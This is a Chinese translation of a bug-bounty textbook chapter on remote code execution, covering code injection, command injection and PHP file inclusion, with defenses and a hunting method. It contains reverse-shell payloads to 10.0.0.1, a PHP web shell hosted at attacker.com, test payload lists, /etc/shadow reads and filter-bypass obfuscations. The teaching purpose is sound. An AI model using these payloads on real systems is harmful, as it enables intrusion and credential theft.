# 第十八章：远程代码执行

![](img/chapterart.png)

*远程代码执行（**RCE**）*发生在攻击者能够因漏洞或配置错误在目标机器上执行任意代码时。RCE 非常危险，因为攻击者往往最终会危及到网页应用程序，甚至是底层的网页服务器。

实现 RCE 并没有单一的技术。在前面的章节中，我提到过攻击者可以通过 SQL 注入、不安全的反序列化和模板注入等方式来实现 RCE。在本章中，我们将讨论另外两种可能让你在目标系统上执行代码的策略：代码注入和文件包含漏洞。

在继续之前，请记住，开发 RCE 漏洞通常需要更深入的编程知识、Linux 命令和 Web 应用开发技能。一旦你掌握了发现更简单漏洞的方法，你就可以开始朝这个方向努力了。

## 机制

有时攻击者可以通过将恶意代码直接注入到执行的代码中来实现 RCE。这些是*代码注入漏洞*。攻击者还可以通过将恶意代码放入受害者应用程序执行或包含的文件中来实现 RCE，这些漏洞被称为*文件包含漏洞*。

### 代码注入

代码注入漏洞发生在应用程序允许用户输入与可执行代码混淆时。有时这是无意中发生的，当应用程序将未经处理的数据传递到执行代码时；其他时候，这是作为一个有意的特性嵌入到应用程序中的。

例如，假设你是一个开发者，正在构建一个在线计算器。Python 的`eval()`函数接受一个字符串并将其作为 Python 代码执行：`eval("1+1")`会返回`2`，而`eval("1*3")`会返回`3`。由于它能够灵活地评估各种用户提交的表达式，`eval()`是实现计算器的便捷方式。因此，假设你写了如下的 Python 代码来实现此功能。该程序将接受一个用户输入的字符串，传递给`eval()`并返回结果：

```
def calculate(input): return eval("{}".format(input))
result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

用户可以通过以下 GET 请求向计算器发送操作。当按预期操作时，以下用户输入将输出字符串`结果是 3`：

```
GET /calculator?calc=1+2
Host: example.com
```

但由于在此情况下`eval()`接收用户提供的输入并将其作为 Python 代码执行，攻击者可能会提供更具恶意性的内容。记得第十六章中 Python 的`os.system()`命令吗？它执行输入字符串作为系统命令。假设攻击者向`calculate()`函数提交了以下 HTTP 请求：

```
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

结果，程序将执行`eval("__import__('os').system('ls')")`并返回系统命令`ls`的结果。由于`eval()`可以用来执行系统上的任意代码，如果你将未经处理的用户输入传入`eval()`函数，那么你就引入了一个代码注入漏洞到你的应用程序中。

攻击者还可以做更具破坏性的事情，像以下内容。此输入会导致应用程序调用 `os.system()` 并在端口 8080 上向 IP 10.0.0.1 发起反向 shell 连接：

```
GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
Host: example.com
```

*反向 shell* 使得目标服务器与攻击者的机器进行通信，并建立一个远程可访问的连接，允许攻击者执行系统命令。

另一种代码注入的变体发生在用户输入直接与系统命令连接时。这也叫做*命令注入漏洞*。除了在 Web 应用程序中出现，命令注入在嵌入式 Web 应用程序中也非常普遍，因为它们依赖于 shell 命令和使用外壳命令执行的框架。

假设 *example.com* 还具有允许你下载远程文件并在网站上查看的功能。为了实现这个功能，应用程序使用系统命令 `wget` 来下载远程文件：

```
import os
def download(url): os.system("**wget** -O- {}".format(url))
display(download(user_input.url))
```

`wget` 命令是一个根据 URL 下载网页的工具，`-O-` 选项使得 `wget` 下载文件并将其显示在标准输出中。综合起来，这个程序接收用户输入的 URL，并将其传递给通过 `os.system()` 执行的 `wget` 命令。例如，如果提交以下请求，应用程序将下载 Google 首页的源代码并显示给你：

```
GET /download?url=google.com
Host: example.com
```

由于用户输入直接传递给系统命令，攻击者可以在不使用 Python 函数的情况下注入系统命令。这是因为在 Linux 命令行中，分号（`;`）字符用于分隔单个命令，因此攻击者可以通过在分号后提交任意命令，执行 `wget` 命令之后的任意命令。例如，以下输入会导致应用程序在端口 8080 上向 IP 10.0.0.1 发起反向 shell 连接：

```
GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
Host: example.com
```

### 文件包含

大多数编程语言都具有允许开发者*包含*外部文件以评估其中代码的功能。当开发者想将外部资产文件（如图片）集成到应用程序中，使用外部代码库，或者复用为不同目的编写的代码时，这个功能非常有用。

攻击者实现远程代码执行（RCE）的一种方式是让目标服务器包含包含恶意代码的文件。这个*文件包含漏洞*有两种子类型：远程文件包含和本地文件包含。

*远程文件包含*漏洞发生在应用程序允许从远程服务器包含任意文件时。这通常发生在应用程序动态地在其页面上包含外部文件和脚本，并且使用用户输入来确定包含文件的位置。

为了了解这个是如何工作的，我们来看看一个易受攻击的应用程序。以下 PHP 程序调用 PHP 的`include`函数，并使用用户提交的 HTTP GET 参数`page`的值。然后，`include`函数会包含并执行指定的文件：

```
<?php // Some PHP code $file = $_GET["page"]; include $file; // Some PHP code
?>
```

这段代码允许用户通过更改`page`参数来访问网站的不同页面。例如，要查看网站的首页和关于页面，用户可以访问*http://example.com/?page=index.php*和*http://example.com/?page=about.php*。

但是，如果应用程序没有限制用户通过`page`参数包含的文件，攻击者可以包含托管在他们服务器上的恶意 PHP 文件，并让目标服务器执行该文件。

在这种情况下，我们可以托管一个名为*malicious.php*的 PHP 页面，它会将 URL GET 参数`cmd`中的字符串作为系统命令执行。PHP 中的`system()`命令类似于 Python 中的`os.system()`。它们都会执行系统命令并显示输出。以下是我们恶意 PHP 文件的内容：

```
<?PHP system($_GET["cmd"]);
?>
```

如果攻击者在*example.com*上加载此页面，网站将执行位于攻击者服务器上的*malicious.php*中包含的代码。恶意脚本将使目标服务器执行系统命令`ls`：

```
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

注意，这个功能同样也容易受到 SSRF 和 XSS 攻击的影响。该端点容易受到 SSRF 攻击，因为页面可以加载本地系统和网络的信息。攻击者还可以使页面加载恶意的 JavaScript 文件，并诱使用户点击以执行反射型 XSS 攻击。

另一方面，*本地文件包含*发生在应用程序以不安全的方式包含文件时，但不允许包含远程文件。在这种情况下，攻击者需要首先将恶意文件上传到本地机器，然后通过使用本地文件包含来执行它。我们可以稍微修改之前的例子。以下 PHP 文件首先获取 HTTP GET 参数`page`，然后在将`page`与包含用户可以加载的文件的目录名称拼接后，调用 PHP 的`include`函数：

```
<?php // Some PHP code $file = $_GET["page"]; include "lang/".$file; // Some PHP code
?>
```

该网站的*lang*目录包含多个语言版本的首页。例如，用户可以访问*http://example.com/?page=de-index.php*和*http://example.com/?page=en-index.php*来分别访问德语和英语首页。这些网址将导致网站加载页面*/var/www/html/lang/de-index.php*和*/var/www/html/lang/en-index.php*，以显示德语和英语的首页。

在这种情况下，如果应用程序没有对`page`参数的可能值施加任何限制，攻击者可以通过利用上传功能加载他们自己的页面。假设*example.com*允许用户上传所有类型的文件，并将它们存储在*/var/www/html/uploads/USERNAME*目录下。攻击者可以将一个恶意的 PHP 文件上传到*uploads*文件夹中。然后，他们可以使用`../`序列跳出*lang*目录，并在目标服务器上执行恶意上传的文件：

```
http://example.com/?page=../uploads/USERNAME/malicious.php
```

如果攻击者加载此 URL，网站将包含文件*/var/www/html/lang/../uploads/USERNAME/malicious.php*，该文件指向*/var/www/html/uploads/USERNAME/malicious.php*。

## 防护

为了防止代码注入，你应该避免将用户输入插入到需要执行的代码中。而且，由于用户输入可以通过应用程序解析的文件传入已评估的代码，你应该将用户上传的文件视为不可信的，并保护程序执行、解析或包含的现有系统文件的完整性。

为了防止文件包含漏洞，你应该避免基于用户输入来包含文件。如果这不可避免，请禁止包含远程文件，并创建一个允许的本地文件白名单，供程序包含。你还可以限制文件上传类型为某些安全文件类型，并将上传的文件托管在与应用程序源代码分开的环境中。

同时，避免直接调用系统命令，改用编程语言的系统 API。大多数编程语言都有内置函数，允许你在不冒命令注入风险的情况下执行系统命令。例如，PHP 有一个名为`mkdir(``DIRECTORY_NAME``)`的函数，你可以使用它来创建新目录，而不是调用`system("mkdir` `DIRECTORY_NAME``")`。

你应该为传入危险函数（如`eval()`或`include()`）的输入实现强大的输入验证。但这种技术不能作为唯一的保护措施，因为攻击者不断想出创新的方法绕过输入验证。

最后，保持更新补丁将防止应用程序的依赖关系引入 RCE 漏洞。应用程序的依赖关系，如开源包和组件，常常会将漏洞引入应用程序。这也被称为*软件供应链攻击*。

你还可以部署一个*Web 应用防火墙* *(**WAF**)*来阻止可疑的攻击。除了防止远程代码执行（RCE）外，这还可以帮助防止我在本书中早些时候讨论的一些漏洞，如 SQL 注入和 XSS。

如果攻击者确实在一台机器上成功实现了 RCE，你如何减少他们造成的危害？*最小权限原则* 规定，应用程序和进程应仅授予完成任务所需的最小权限。这是一种最佳实践，可以降低系统在遭受攻击时被危害的风险，因为即使攻击者攻破了一个低权限的用户或进程，他们也无法访问敏感文件和执行敏感操作。例如，当一个 Web 应用只需要对文件进行读取访问时，不应授予任何写入或执行权限。这是因为，如果攻击者劫持了一个以高权限运行的应用程序，攻击者就能够获得其权限。

## 寻找 RCE 漏洞

像我们至今所讨论的许多攻击一样，RCE 有两种类型：经典型和盲注型。*经典 RCE* 是指你可以在随后的 HTTP 响应中看到代码执行的结果，而 *盲注型 RCE* 则是指恶意代码被执行，但执行的返回值不会出现在任何 HTTP 响应中。尽管攻击者无法看到执行结果，但盲注型 RCE 和经典型 RCE 一样危险，因为它们能够使攻击者生成反向 shell 或将数据外泄到远程服务器。寻找这两种类型的 RCE 是一个类似的过程，但验证这些漏洞所需使用的命令或代码片段会有所不同。

这里是一些你可以用来攻击 Linux 服务器的命令。在寻找经典型 RCE 漏洞时，验证漏洞所需做的就是执行诸如 `whoami` 这样的命令，它会输出当前用户的用户名。如果响应中包含了 Web 服务器的用户名，比如 `www-data`，那你就确认了 RCE，因为命令已经成功执行。另一方面，要验证盲注型 RCE，你需要执行一个会影响系统行为的命令，比如 `sleep 5`，它会延迟 5 秒钟的响应。然后，如果你在收到响应之前经历了 5 秒的延迟，你就能确认这个漏洞。与我们用来利用其他漏洞的盲注技术类似，你还可以设置监听器，并尝试从目标服务器触发带外交互。

### 步骤 1：收集目标的信息

寻找任何漏洞的第一步是收集目标的信息。在寻找 RCE（远程代码执行）漏洞时，这一步尤为重要，因为实现 RCE 的路径极大地依赖于目标的构建方式。你应该了解关于当前目标的 Web 服务器、编程语言以及其他技术的信息。使用第五章中概述的侦察步骤来完成这项工作。

### 步骤 2：识别可疑的用户输入位置

与发现许多其他漏洞一样，找到任何 RCE 的下一步是识别用户可以提交输入到应用程序的位置。在寻找代码注入时，要注意每一个直接的用户输入位置，包括 URL 参数、HTTP 头部、正文参数和文件上传。有时候，应用程序会不安全地解析用户提供的文件，并将其内容连接到执行的代码中，因此任何最终传递到命令中的输入都是你应该留意的。

为了查找潜在的文件包含漏洞，请检查用于确定文件名或路径的输入位置，以及应用程序中的任何文件上传功能。

### 第 3 步：提交测试载荷

接下来，你应该向应用程序提交测试载荷。对于代码注入漏洞，尝试提交那些服务器会作为代码解释执行的载荷，看看它们是否被执行。例如，以下是你可以使用的载荷列表：

**Python 载荷**

此命令旨在打印字符串`RCE test!`，如果 Python 执行成功：

```
print("RCE test!")
```

此命令打印系统命令`ls`的结果：

```
"__import__('os').system('ls')"
```

此命令将响应延迟 10 秒：

```
"__import__('os').system('sleep 10')"
```

**PHP 载荷**

此命令旨在打印本地 PHP 配置信息，如果执行成功：

```
phpinfo();
```

此命令打印系统命令`ls`的结果：

```
<?php system("ls");?>
```

此命令将响应延迟 10 秒：

```
<?php system("sleep 10");?>
```

**Unix 载荷**

此命令打印系统命令`ls`的结果：

```
;ls;
```

这些命令将响应延迟 10 秒：

```
| sleep 10;
& sleep 10;
` sleep 10;`
$(sleep 10)
```

对于文件包含漏洞，你应该尝试让端点包含一个你可以控制的远程文件或本地文件。例如，对于远程文件包含，你可以尝试多个指向你托管的恶意文件的 URL 形式：

```
http://example.com/?page=http://attacker.com/malicious.php
http://example.com/?page=http:attacker.com/malicious.php
```

对于本地文件包含漏洞，尝试使用指向你控制的本地文件的不同 URL：

```
http://example.com/?page=../uploads/malicious.php
http://example.com/?page=..%2fuploads%2fmalicious.php
```

你可以使用第十三章中学到的保护绕过技巧来构造相同 URL 的不同形式。

### 第 4 步：确认漏洞

最后，通过执行像`whoami`、`ls`和`sleep 5`这样的无害命令来确认漏洞。

## 提升攻击

在提升 RCE 漏洞时要格外小心。大多数公司更倾向于你不要尝试提升 RCE，因为他们不希望有人在包含机密数据的系统中乱搞。在一次典型的渗透测试中，黑客通常会试图弄清楚当前用户的权限，并在获得 RCE 后尝试进行权限提升攻击。但在漏洞悬赏的背景下，这样做是不合适的。你可能会意外地读取到关于客户的敏感信息，或者通过修改关键文件造成系统损坏。务必仔细阅读漏洞悬赏程序的规则，以免越界。

对于经典的 RCE，创建一个执行无害命令（如`whoami`或`ls`）的概念证明。你也可以通过读取一个常见的系统文件（如*/etc/passwd*）来证明你找到了 RCE 漏洞。你可以使用`cat`命令来读取系统文件：

```
cat /etc/passwd
```

在 Linux 系统中，*/etc/passwd*文件包含系统的账户及其用户 ID、组 ID、主目录和默认 shell。这些文件通常无需特殊权限即可读取，因此这是一个首先尝试访问的好文件。

最后，你可以在系统中创建一个具有独特文件名的文件，如*rce_by_YOUR_NAME.txt*，这样就清楚地表明该文件是你 POC 的一部分。你可以使用`touch`命令在当前目录中创建一个具有指定名称的文件：

```
touch rce_by_`YOUR_NAME`.txt
```

对于盲目 RCE，创建一个执行`sleep`命令的 POC。你还可以在目标机器上创建一个反向 shell，连接回你的系统，来创建一个更具影响力的 POC。然而，这通常违反程序规则，所以在进行之前一定要确认。

在为 RCE 漏洞创建 POC 时，很容易超出赏金政策的范围，导致对目标站点造成意外损害。创建 POC 时，请确保你的有效载荷执行的是一个无害命令，并且报告中描述了实现 RCE 所需的步骤。通常，读取一个非敏感文件或在随机路径下创建一个文件就足以证明你的发现。

## 绕过 RCE 保护

许多应用程序已经意识到 RCE 的危险，并采用了输入验证或防火墙来阻止潜在的恶意请求。但编程语言通常非常灵活，这使得我们能够在输入验证规则的范围内工作，从而让我们的攻击得以实现！以下是一些基本的输入验证绕过方法，可以在应用程序阻止你的有效载荷时尝试。

对于 Unix 系统命令，你可以插入引号和双引号，而不改变命令的行为。如果系统在过滤某些字符串时，你还可以使用通配符来替代任意字符。最后，任何空的命令替换结果都可以插入字符串中，而不会改变结果。例如，以下命令都会打印*/etc/shadow*的内容：

```
cat /etc/shadow
cat "/e"tc'/shadow'
cat /etc/sh*dow
cat /etc/sha``dow
cat /etc/sha$()dow
cat /etc/sha${}dow
```

你还可以变换 PHP 中编写相同命令的方式。例如，PHP 允许你将函数名作为字符串进行拼接。你甚至可以对函数名进行十六进制编码，或在命令中插入 PHP 注释，而不改变其结果：

```
/* Text surrounded by these brackets are comments in PHP. */
```

例如，假设你想在 PHP 中执行这个系统命令：

```
system('cat /etc/shadow');
```

以下示例通过将字符串`sys`和`tem`连接来执行一个`system`命令：

```
('sys'.'tem')('cat /etc/shadow');
```

以下示例做了相同的事情，但在命令中间插入了一个空白注释：

```
system/**/('ls');
```

这行代码是`system`命令的十六进制编码版本：

```
'\x73\x79\x73\x74\x65\x6d'('ls');
```

在 Python 中也存在类似的行为。以下在 Python 语法中是等价的：

```
__import__('os').system('cat /etc/shadow')
__import__('o'+'s').system('cat /etc/shadow')
__import__('\x6f\x73').system('cat /etc/shadow')
```

此外，一些服务器会将多个同名参数的值连接成一个单一的值。在这种情况下，你可以将恶意代码拆分成多个部分，以绕过输入验证。例如，如果防火墙阻止包含`system`字符串的请求，你可以将你的 RCE 负载拆分成多个部分，像这样：

```
GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
Host: example.com
```

这些参数将顺利通过防火墙，因为请求在技术上并不包含`system`字符串。但当服务器处理请求时，参数值将被连接成一个单一的字符串，形成我们的 RCE 负载：`"__import__('os').system('ls')"`。

这只是你可以尝试的过滤器绕过的一个小子集；还有很多其他方法。例如，你可以进行十六进制编码、URL 编码、双重 URL 编码，并且改变负载的大小写（大写或小写字符）。你还可以尝试将特殊字符插入到负载中，如空字节、换行符、转义字符`(\)`以及其他特殊或非 ASCII 字符。然后，观察哪些负载被阻止，哪些成功，并创建可以绕过过滤器的漏洞利用，达到你的预期结果。如果你对这个话题感兴趣，可以在线搜索*RCE 过滤器绕过*或*WAF 绕过*来了解更多。此外，本节中提到的原理也可以用于绕过其他漏洞的输入验证，例如 SQL 注入和 XSS。

## 寻找你的第一个 RCE！

是时候通过使用你在本章学到的技巧和窍门来找到你的第一个 RCE 了。

1.  识别可疑的用户输入位置。对于代码注入，要注意每一个用户输入位置，包括 URL 参数、HTTP 头、请求体参数和文件上传位置。要查找潜在的文件包含漏洞，检查用于确定或构造文件名的输入位置，以及文件上传功能。

1.  提交测试负载到输入位置，以检测潜在的漏洞。

1.  如果你的请求被阻止，尝试使用保护绕过技术，看看你的负载是否成功。

1.  最后，通过尝试执行无害命令如`whoami`、`ls`和`sleep 5`来确认漏洞。

1.  避免读取敏感的系统文件或修改你发现漏洞的任何文件。

1.  向项目提交你的第一个 RCE 报告！
